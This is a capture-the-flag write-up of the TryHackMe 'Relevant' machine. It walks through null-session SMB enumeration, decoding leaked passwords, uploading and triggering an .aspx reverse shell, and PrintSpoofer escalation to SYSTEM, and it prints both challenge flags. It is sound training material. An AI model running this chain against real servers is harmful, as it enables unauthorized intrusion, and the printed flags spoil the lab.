### 📄 THM: [Machine Name: Relevant]

**Challenge Details**

- **Category:** [[CyberSecurity]], [[Web Exploitation]], [[Privilege Escalation]]
    
- **Difficulty:** Easy
    
- **Target:** Relevant
    
- **Status:** #solved
    
- **Date Completed:** [[2025-09-03]]
    

---

### 🎯 Objective

This write-up documents the methodology used to compromise the `Relevant` machine. The process involved enumerating open SMB shares to find credentials, using these credentials to upload a reverse shell to a web-accessible directory, and finally escalating privileges from a low-privileged user to `NT AUTHORITY\SYSTEM` using the **PrintSpoofer** exploit.

---

### 🕵️ Reconnaissance & Initial Access

The initial phase focused on identifying the target's open ports and services using Nmap.

Bash

```
nmap -A $target
```

Results:

The scan revealed several open ports, including HTTP (80), SMB (139, 445), and RDP (3389). The SMB service was identified as a Windows Server 2016 instance.

#### SMB Share Enumeration

I used `smbclient` with null authentication to enumerate available shares on the target.

Bash

```
smbclient -L $target -N
```

The output listed several shares, including `ADMIN$`, `C$`, and a very interesting one called `nt4wrksv`. This share did not require authentication.

Bash

```
smbclient //$target/nt4wrksv -N
```

Navigating into the `nt4wrksv` share, I found a file named **`passwords.txt`**. I downloaded the file to my local machine.

Bash

```
smb: \> get passwords.txt
```

#### Decoding Credentials

The `passwords.txt` file contained two Base64-encoded strings, labeled for users **Bob** and **Bill**. I decoded them using `base64 -d`.

Bash

```
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
```

**Results:**

- **Bob:** `!P@$$W0rD!123`
    
- **Bill:** `Juw4nnaM4n420696969!$$$`
    

These credentials provided a potential entry point. The username `Bob` was a good candidate, as the user flag is often in a low-privileged user's directory. After investigation these creds were not useful.

#### Gaining a Reverse Shell

I observed from the Nmap scan that the web server was running **Microsoft IIS**. I had found a publicly accessible SMB share, `nt4wrksv`, that was also a web-accessible directory. I uploaded an `.aspx` reverse shell payload to this share using `smbclient`.

Bash

```
smbclient //$target/nt4wrksv -N
smb: \> put exploit.aspx
```

After the file was uploaded, I set up a Netcat listener on my attack machine.

Bash

```
nc -lvnp 8080
```

Then, I used `curl` to trigger the `exploit.aspx` file by navigating to its public URL, which would cause the web server to execute the payload.

Bash

```
curl http://10.201.38.99/nt4wrksv/exploit.aspx
```

The payload successfully executed, and I received a reverse shell as the `IIS APPPOOL\DefaultAppPool` user, which is a low-privileged user on the system.

I navigated to Bob's Desktop to find the user flag, using the credentials found earlier.

Bash

```
cd /users/bob/desktop
type user.txt
```

## 🚩 User Flag

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

---

### 🪜 Privilege Escalation

To escalate privileges to `SYSTEM`, I looked for a misconfigured service or a known exploit. The `whoami /priv` command showed that my user had the **`SeImpersonatePrivilege`**.

This privilege allows a user to impersonate other accounts, which can be leveraged for privilege escalation on Windows systems. A popular exploit for this is **PrintSpoofer**.

I uploaded the `PrintSpoofer.exe` binary to the `nt4wrksv` directory using the same `smbclient` connection I had established earlier.

Bash

```
smb: \> put PrintSpoofer.exe
```

From the reverse shell, I executed the `PrintSpoofer` binary with the `-i` and `-c` flags to spawn a new command prompt (`cmd.exe`) as `NT AUTHORITY\SYSTEM`.

Bash

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
```

A new, high-privileged shell was spawned. I confirmed my new user context.

```
C:\Windows\system32>whoami
nt authority\system
```

With `SYSTEM` privileges, I navigated to the `Administrator` user's Desktop to retrieve the `root.txt` file.

Bash

```
C:\Windows\system32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
```

## 🏆 Root Flag

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

### 🧠 Lessons Learned

- **Mind the Public Shares!** 📂 Leaving sensitive information like a `passwords.txt` file in a public-facing directory or a share with null session access is a major security flaw. Threat actors will always check for these low-hanging fruit first.
    
- **Web Server Configuration is Key!** 🌐 Publicly accessible directories, especially those that can be written to, should not also serve as web roots. This misconfiguration allowed for the upload and execution of a web shell, bypassing the need for a more complex RCE exploit.
    
- **Privilege Enumeration is Crucial!** 🕵️ Knowing which privileges a low-privileged user has is vital for escalating access. The `SeImpersonatePrivilege` is a common finding on Windows machines and is a go-to for many well-known exploits.
    
- **Exploit Chaining is an Art!** 🔗 This box demonstrated how seemingly small vulnerabilities can be chained together. A weak SMB share led to credentials, which led to a shell, and a misconfigured privilege then led to a root shell. It's rare for one vulnerability to give you everything; a successful attack often involves linking multiple small flaws together.
    
- **Credentials Aren't Always for Remote Login!** The two sets of credentials found, for **Bob** and **Bill**, were not used to directly log in via RDP or another remote service. Instead, they were clues that helped confirm the user account for which the `user.txt` flag was located. Sometimes, credentials act as a breadcrumb trail rather than a direct key.
    
- **File Permissions Matter!** 📝 The ability for a low-privileged user to write to a directory that also serves a web application is a critical failure. The `nt4wrksv` share should have been configured with read-only permissions for guest users, preventing the upload of malicious files.
